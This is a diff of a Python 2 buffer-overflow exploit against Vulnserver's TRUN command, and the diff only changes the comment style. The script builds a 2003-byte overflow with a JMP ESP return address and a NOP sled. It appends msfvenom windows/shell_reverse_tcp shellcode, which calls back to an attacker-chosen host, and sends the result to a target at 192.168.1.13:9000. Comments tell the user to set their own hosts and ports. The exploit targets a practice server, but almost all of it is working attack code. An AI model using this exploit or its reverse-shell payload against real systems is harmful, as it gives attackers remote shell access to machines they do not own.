@@ -1,16 +1,16 @@
-//This is the Final Code of Buffer Overflow of the Vulnserver. 
-//Make sure to change the LHOST , RHOST , LPORT and RPORT according to your IP.
-//This script is based on python2
+#This is the Final Code of Buffer Overflow of the Vulnserver. 
+#Make sure to change the LHOST , RHOST , LPORT and RPORT according to your IP.
+#This script is based on python2
 
 import sys, socket
 
 buf = "TRUN /.:/"
 
-//JMP ESP = 625011AF
+#JMP ESP = 625011AF
 
 buf += "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 10 
 
-//msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=port -f python -a x86 --platform windows -b "\x00"
+#msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=port -f python -a x86 --platform windows -b "\x00"
 
 buf += b"\xba\xdb\x60\xb8\x29\xd9\xc0\xd9\x74\x24\xf4\x5e\x33"
 buf += b"\xc9\xb1\x52\x83\xc6\x04\x31\x56\x0e\x03\x8d\x6e\x5a"
@@ -42,8 +42,8 @@ buf += b"\x85\xed\x48\xff\x01\x1e\x21\x90\xe7\x20\x96\x91\x2d"
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
-//RHOST = 192.168.1.13 (Change according to your IP)
-//RPORT = 9000 (Change according to your Vulnerable service port)
+#RHOST = 192.168.1.13 (Change according to your IP)
+#RPORT = 9000 (Change according to your Vulnerable service port)
 
 s.connect(('192.168.1.13',9000))
 print s.recv(1024)
